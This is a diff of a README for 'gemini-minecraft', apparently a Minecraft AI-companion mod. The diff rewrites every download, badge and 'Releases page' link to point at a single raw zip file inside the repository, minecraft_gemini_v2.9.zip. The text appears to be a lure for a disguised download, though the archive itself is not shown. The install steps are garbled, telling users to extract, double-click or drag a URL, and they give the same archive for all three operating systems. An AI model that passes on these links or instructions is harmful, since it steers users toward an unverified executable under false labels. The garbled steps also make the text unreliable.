@@ -12,33 +12,33 @@ Before you begin, ensure your setup meets the following requirements:
 - **Java Version:** Java 17 or higher installed
 
 ## 🔗 Download Now!
-[![Download gemini-minecraft](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip%20gemini--minecraft-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip)
+[![Download gemini-minecraft](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip%20gemini--minecraft-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip).
+To get started, visit this page to download: [GitHub Releases](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip).
 
-1. Go to the [Releases page](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip).
+1. Go to the [Releases page](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip).
 2. Look for the latest version available.
 3. Download the file that matches your operating system. 
-   - For Windows, download `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip`.
-   - For macOS, download `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip`.
-   - For Linux, download `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip`.
+   - For Windows, download `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip`.
+   - For macOS, download `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip`.
+   - For Linux, download `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip`.
 
 4. Once the download is complete, locate the file in your downloads folder.
 
 ### 🖥️ Windows Installation
-1. Extract the `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip` file.
+1. Extract the `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip` file.
 2. Open the extracted folder.
-3. Double-click on `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip` to run the application.
+3. Double-click on `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip` to run the application.
 
 ### 🍏 macOS Installation
-1. Extract the `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip` file.
+1. Extract the `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip` file.
 2. Open the extracted folder.
-3. Drag `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip` to your Applications folder.
+3. Drag `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip` to your Applications folder.
 4. Open it from your Applications folder.
 
 ### 🐧 Linux Installation
-1. Extract the `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip` file.
+1. Extract the `https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip` file.
 2. Open the terminal and navigate to the extracted folder.
 3. Run the command: `./gemini-minecraft`.
 
@@ -75,4 +75,4 @@ If you need assistance, feel free to reach out. You can also join our community 
 - minecraft-mod
 - voice-transcription
 
-Thank you for choosing **gemini-minecraft**! Enjoy your gaming experience with your new AI companion. For more details and updates, refer to our [Releases page](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft-gemini-1.4.zip).
+Thank you for choosing **gemini-minecraft**! Enjoy your gaming experience with your new AI companion. For more details and updates, refer to our [Releases page](https://github.com/GURU-124/gemini-minecraft/raw/refs/heads/main/misc/minecraft_gemini_v2.9.zip).
